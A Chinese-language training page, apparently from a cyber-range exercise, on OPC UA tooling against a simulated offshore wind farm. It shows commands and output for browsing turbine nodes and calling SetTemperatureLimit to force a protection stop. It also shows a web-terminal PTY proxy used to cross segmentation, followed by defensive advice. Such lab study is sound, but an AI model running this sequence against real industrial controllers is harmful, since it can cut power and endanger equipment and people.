---
title: OPC UA 工具 opcua-tools 与图形客户端
category: 工控/工具
tags: [OPCUA, opcua-tools, asyncua, open62541]
order: 3
source: 海上链攻击链指南.md、工控协议权威资料与学习方案.md
---

## 一句话概括

`opcua-tools` 是维护工作站上的一套 Python 小工具集，把 OPC UA 的四类基础操作各做成一个脚本：发现端点、遍历资产树、读变量、调方法；它让"看懂 OPC UA 地址空间"从翻文档变成执行一条命令。

## 原理

### OPC UA 的基本概念（对应工具能力）

依据学习方案，OPC UA 的学习重点与工具能力一一对应：

```text
Endpoint discovery   发现服务端端点      -> discover.py
Address Space        地址空间            -> 被 browse.py 遍历
NodeId               节点标识            -> read.py / call_method.py 的 --node
Browse               浏览对象树          -> browse.py
Read/Write/Method Call 读写变量和调用方法 -> read.py / call_method.py
User token / role    用户认证与角色权限  -> 决定工具能否成功
```

OPC UA 不传一串裸数据，它把设备数据组织成一棵树形目录，每个条目是一个 Node：

```text
WindFarm
└── Offshore
    ├── Turbine07
    │   ├── Telemetry
    │   ├── Grid
    │   ├── Protection（含 SetTemperatureLimit、ResetProtection）
    │   ├── State
    │   └── Alarm
    ├── Turbine08
    └── Turbine09
```

### 工具在攻击链中的位置

素材中的链路：

```text
offshore-maint-ws
  -> 真实 OPC UA Browse / Read / Method Call
  -> offshore-opcua-gateway (10.0.12.8:4840)
  -> Turbine08 protection stop
  -> offshore-scada-hmi 显示停机、脱网、功率归零和告警
```

注意：攻击机在交换机 11（10.0.11.0/24），maint-ws 在交换机 12（10.0.12.0/24），攻击机不能直连 OPC UA 服务，必须走维护工作站的 Web Terminal 代理。这也是这些脚本部署在维护站的原因。

### Python 库与图形客户端的定位

| 组件 | 定位 | 素材中的对应 |
|---|---|---|
| asyncua / FreeOpcUa | Python OPC UA 库，用于自写 Client/Server | 命名空间 `urn:freeopcua:python:server` 即其痕迹；`opcua-tools` 很可能基于它 |
| open62541 | C 语言 OPC UA 开源栈，常用于实现轻量 Server | 学习方案推荐用于搭建 OPC UA Server |
| UaExpert | 图形化 OPC UA 客户端，用于人工浏览与调试 | 学习方案推荐的分析/调试工具 |

## 报文/字段对照

| 工具 | 作用 | 关键输出/参数 |
|---|---|---|
| discover.py | 端点发现与命名空间列表 | `CONNECTED <endpoint>`、`Namespaces: ns=0/1/2` |
| browse.py | 遍历资产树 | 三台风机各自的 Telemetry / Grid / Protection / State / Alarm |
| read.py | 读变量 | `--turbine Turbine08`，输出 temperature、temperature_limit 等 |
| call_method.py | 调用方法 | `--node`、`--value`、`--no-arg` |

Scripts 路径与解释器（素材实测）：

```text
工具目录：  ~/opcua-tools/
解释器：    /opt/windfarm/offshore-maint-ws/venv/bin/python
```

## 用法

### discover.py：端点发现与命名空间

```bash
/opt/windfarm/offshore-maint-ws/venv/bin/python ~/opcua-tools/discover.py
```

实测输出：

```text
CONNECTED opc.tcp://10.0.12.8:4840/windfarm/offshore/
Namespaces:
  ns=0 http://opcfoundation.org/UA/
  ns=1 urn:freeopcua:python:server
  ns=2 urn:windfarm:njust:offshore:opcua-gateway
```

要点：`ns=2` 是业务自己的命名空间，后面 `--node "ns=2;s=..."` 里的 `ns=2` 就来自这里；不知道命名空间索引就拼不出 NodeId。

### browse.py：遍历资产树

```bash
/opt/windfarm/offshore-maint-ws/venv/bin/python ~/opcua-tools/browse.py
```

预期：完整资产树，三台风机各有 `Telemetry`、`Grid`、`Protection`（含 `SetTemperatureLimit`、`ResetProtection`）、`State`、`Alarm`。

把 OPC UA 服务器想象成一台文件服务器：风机内部的数据和功能像文件夹一样分层挂着，browse 就是把目录列出来。Turbine 和 Protection 方法不在门户首页展示，必须通过 OPC UA 协议发现。

### read.py：读变量

```bash
/opt/windfarm/offshore-maint-ws/venv/bin/python ~/opcua-tools/read.py --turbine Turbine08
```

实测输出：

```text
[Turbine08]
temperature=73.0
temperature_limit=95.0
active_power=342.0
grid_state=ON_GRID
turbine_state=RUNNING
alarm=NONE
```

这一步的作用是"通过信息推测停机标准"：当前温度 73.0，保护阈值 95.0，把阈值改到低于当前温度就会触发保护。

### call_method.py：调用方法

带参数调用：

```bash
/opt/windfarm/offshore-maint-ws/venv/bin/python ~/opcua-tools/call_method.py \
  --node "ns=2;s=WindFarm.Offshore.Turbine08.Protection.SetTemperatureLimit" \
  --value 40
```

实测返回：

```text
StatusCode: Good
  old_limit_c = 95.0
  new_limit_c = 40.0
  evaluation = 61.0 > 40.0
  action = PROTECTION_STOP
StateAfterCall:
  temperature_limit=40.0
  active_power=0.0
  grid_state=OFF_GRID
  turbine_state=PROTECTION_STOP
  alarm=TEMP_THRESHOLD_TRIP
```

不带参数调用（`--no-arg`）：

```bash
/opt/windfarm/offshore-maint-ws/venv/bin/python ~/opcua-tools/call_method.py \
  --node "ns=2;s=WindFarm.Offshore.Turbine08.Protection.ResetProtection" \
  --no-arg
```

用途：恢复现场（reset_protection）。

关键教学点：攻击者篡改的是风机的"安全警戒线"，并没有直接发"停机"命令。风机的自我保护逻辑本身合法正常，它只是忠实执行了自己认为正确的安全响应。这与写 Modbus 控制寄存器思路不同，但对 HMI 的最终表现一致（停机、脱网、功率归零、告警）。

### 通过 Web Terminal 代理执行

由于网段隔离，实际执行要走维护网关的 PTY API（素材实测形式）：

```bash
curl -s -X POST "http://10.0.11.8:8080/ops/remote-maint/api/pty/write" \
  -H "Content-Type: application/json" \
  -d "{\"sid\":\"$SID\",\"input\":\"/opt/windfarm/offshore-maint-ws/venv/bin/python ~/opcua-tools/discover.py\n\"}"
sleep 3
curl -s "http://10.0.11.8:8080/ops/remote-maint/api/pty/read?sid=$SID"
```

即"先 write 发命令、再 read 读输出"，等价于在远程机器上敲命令。

## 安全视角

### 使用注意

```text
1. 只对授权环境使用：Method Call 会改变设备状态（如触发保护停机），
   必须限定在靶场/仿真范围内，真实生产系统需书面授权。
2. 注意 SecurityMode / SecurityPolicy：
   SecurityMode=None 属于错误配置，意味着无加密无签名，
   任何人可读可写；正确做法是启用签名+加密策略。
3. 注意证书：加密模式下客户端需信任服务端证书并持有客户端证书，
   证书配置不当会导致连不上，或降级到不安全模式。
4. 注意用户认证与角色：匿名 Browse 可能泄露整棵点表；
   低权限用户不应能调用控制类 Method。
```

### 防护落点

- 关闭匿名访问，只允许认证用户 Browse；对匿名用户只暴露必要节点。
- 控制类 Method（如 SetTemperatureLimit、ResetProtection）单独授权，与只读账号分离。
- 强制 SecurityMode = SignAndEncrypt，禁用 None。
- 记录方法调用日志（谁在什么时候把阈值改成了多少），便于审计与追溯。
